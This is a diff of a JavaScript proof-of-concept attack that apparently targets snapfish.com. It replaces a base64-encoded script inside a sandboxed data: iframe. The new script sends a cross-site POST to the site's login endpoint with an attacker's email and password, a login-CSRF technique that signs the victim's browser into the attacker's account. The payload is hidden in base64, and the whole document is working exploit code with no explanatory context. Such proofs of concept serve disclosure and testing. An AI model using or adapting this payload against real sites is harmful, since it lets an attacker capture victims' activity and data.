@@ -12,18 +12,8 @@
         }
 
         function step2(){
-
-            const login_code = `
-            var body = "iwPreActions=submit&pnsUrl=%2Floginto&next=https%253A%252F%252Fwww.snapfish.com%252Fhome%253Floginwith%253Demail&SECURITY_CSRFTOKEN=&SubscriptionFlag=checked&EmailAddress=attackeroqn3vg%40khara.one&Password=NewPassword%212024";
-            var aBody = new Uint8Array(body.length);
-            for (var i = 0; i < aBody.length; i++)
-            aBody[i] = body.charCodeAt(i); 
-
-
-            navigator.sendBeacon("https:\/\/www.snapfish.com\/loginto?submit=true&componentID=1395868004571", new Blob([aBody], { type: "application/x-www-form-urlencoded" }));
-            `;
             var attackerLoginFrame = document.createElement('iframe');
-            attackerLoginFrame.setAttribute('src', 'data:text/html;base64,PHNjcmlwdD4KdmFyIGJvZHkgPSAiaXdQcmVBY3Rpb25zPXN1Ym1pdCZwbnNVcmw9JTJGbG9naW50byZuZXh0PWh0dHBzJTI1M0ElMjUyRiUyNTJGd3d3LnNuYXBmaXNoLmNvbSUyNTJGaG9tZSUyNTNGbG9naW53aXRoJTI1M0RlbWFpbCZTRUNVUklUWV9DU1JGVE9LRU49JlN1YnNjcmlwdGlvbkZsYWc9Y2hlY2tlZCZFbWFpbEFkZHJlc3M9YXR0YWNrZXJvcW4zdmclNDBraGFyYS5vbmUmUGFzc3dvcmQ9TmV3UGFzc3dvcmQlMjEyMDI0IjsKdmFyIGFCb2R5ID0gbmV3IFVpbnQ4QXJyYXkoYm9keS5sZW5ndGgpOwpmb3IgKHZhciBpID0gMDsgaSA8IGFCb2R5Lmxlbmd0aDsgaSsrKQoJYUJvZHlbaV0gPSBib2R5LmNoYXJDb2RlQXQoaSk7IApuYXZpZ2F0b3Iuc2VuZEJlYWNvbigiaHR0cHM6XC9cL3d3dy5zbmFwZmlzaC5jb21cL2xvZ2ludG8/c3VibWl0PXRydWUmY29tcG9uZW50SUQ9MTM5NTg2ODAwNDU3MSIsIG5ldyBCbG9iKFthQm9keV0sIHsgdHlwZTogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIgfSkpOwo8L3NjcmlwdD4=');
+            attackerLoginFrame.setAttribute('src', 'data:text/html;base64,PHNjcmlwdD4KICAgICAgICAgICAgdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgICAgICAgICB4aHIub3BlbigiUE9TVCIsICJodHRwczpcL1wvd3d3LnNuYXBmaXNoLmNvbVwvbG9naW50bz9zdWJtaXQ9dHJ1ZSZjb21wb25lbnRJRD0xMzk1ODY4MDA0NTcxIiwgdHJ1ZSk7CiAgICAgICAgICAgIHhoci5zZXRSZXF1ZXN0SGVhZGVyKCJjb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb25cL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwogICAgICAgICAgICB4aHIud2l0aENyZWRlbnRpYWxzID0gdHJ1ZTsKICAgICAgICAgICAgdmFyIGJvZHkgPSAiaXdQcmVBY3Rpb25zPXN1Ym1pdCZwbnNVcmw9JTJGbG9naW50byZuZXh0PWh0dHBzJTI1M0ElMjUyRiUyNTJGd3d3LnNuYXBmaXNoLmNvbSUyNTJGaG9tZSUyNTNGbG9naW53aXRoJTI1M0RlbWFpbCZTRUNVUklUWV9DU1JGVE9LRU49JlN1YnNjcmlwdGlvbkZsYWc9Y2hlY2tlZCZFbWFpbEFkZHJlc3M9YXR0YWNrZXJvcW4zdmclNDBraGFyYS5vbmUmUGFzc3dvcmQ9TmV3UGFzc3dvcmQlMjEyMDI0IjsKICAgICAgICAgICAgdmFyIGFCb2R5ID0gbmV3IFVpbnQ4QXJyYXkoYm9keS5sZW5ndGgpOwogICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGFCb2R5Lmxlbmd0aDsgaSsrKQogICAgICAgICAgICAgICAgYUJvZHlbaV0gPSBib2R5LmNoYXJDb2RlQXQoaSk7CiAgICAgICAgICAgIHhoci5zZW5kKG5ldyBCbG9iKFthQm9keV0pKTsKPC9zY3JpcHQ+');
             attackerLoginFrame.setAttribute('width', '100px');
             attackerLoginFrame.setAttribute('height', '100px');
             attackerLoginFrame.setAttribute('sandbox', 'allow-scripts');
